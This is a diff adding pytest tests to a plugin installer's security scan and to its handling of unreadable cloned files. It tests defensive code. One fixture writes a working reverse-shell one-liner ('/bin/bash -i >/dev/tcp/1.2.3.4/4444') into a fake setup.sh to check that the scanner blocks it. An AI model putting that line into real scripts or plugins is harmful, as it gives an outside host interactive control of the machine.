@@ -798,6 +798,94 @@ class TestSubdirInstallE2E:
         assert pc._resolve_plugin_key("portable.test") == "portable.test"
 
 
+class TestReviewedPinScanTrust:
+    """A caution-verdict tree installs without a prompt when it is the reviewed catalog pin, still
+    prompts/blocks as a raw source or at a different revision, and dangerous blocks regardless."""
+
+    SHA = "a" * 40
+
+    def _fake_clone(self, pc, monkeypatch, plugins_dir, extra_file, body):
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: scanme\nmanifest_version: 1\n", encoding="utf-8")
+            (tmp_clone / extra_file).write_text(body, encoding="utf-8")
+            return revision or "b" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)
+
+    def test_caution_trusted_only_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n")  # caution
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False)
+        with pytest.raises(pc.PluginScanBlocked):  # catalog install whose checkout is NOT the pin
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref="c" * 40, reviewed_pin=self.SHA)
+        target, _manifest, name = pc._install_plugin_core(
+            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+        assert name == "scanme" and target.is_dir()
+
+    def test_dangerous_blocks_even_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+
+
+class TestInstallReadabilityGate:
+    """A clone that lands unreadable is repaired or rolled back, never shipped (#111804)."""
+
+    def _clone_with_unreadable_manifest(self, monkeypatch, pc):
+        real_chmod = os.chmod  # the rollback test replaces os.chmod after this fixture runs
+
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: badperm\nmanifest_version: 1\n", encoding="utf-8")
+            real_chmod(tmp_clone / "plugin.yaml", 0)
+            return "0" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_scan_plugin_tree", lambda *a, **k: None)
+
+    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
+    def test_unreadable_file_is_repaired_before_install(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        self._clone_with_unreadable_manifest(monkeypatch, pc)
+
+        target, manifest, name = pc._install_plugin_core("file:///tmp/x", force=False)
+
+        assert name == "badperm"  # manifest read after repair, not the URL fallback
+        assert (target / "plugin.yaml").read_text(encoding="utf-8").startswith("name: badperm")
+
+    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
+    def test_unrepairable_tree_rolls_back_and_names_the_fix(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        self._clone_with_unreadable_manifest(monkeypatch, pc)
+        monkeypatch.setattr(pc.os, "chmod", lambda *a, **k: (_ for _ in ()).throw(PermissionError(1, "nope")))
+
+        with pytest.raises(PluginOperationError, match=r"plugin.yaml is not readable.*chmod -R u\+rX"):
+            pc._install_plugin_core("file:///tmp/x", force=False)
+
+        assert list(plugins_dir.iterdir()) == []  # no half-installed dir, no staging leftovers
+
+
 def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
     import json
 
